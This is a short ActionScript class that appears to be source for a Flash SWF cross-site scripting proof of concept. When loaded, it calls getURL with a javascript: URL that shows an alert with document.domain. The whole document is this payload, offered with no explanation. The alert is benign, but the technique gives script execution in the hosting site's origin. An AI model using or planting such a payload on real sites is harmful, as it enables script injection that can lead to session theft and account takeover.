 class XSS {
       static var app: XSS;
       function XSS() {
         var xss = "javascript:alert(\"SWF-based XSS: \"+document.domain)";
         getURL(xss, "_self");
       }
       static function main(mc) {
         app = new XSS();
  }}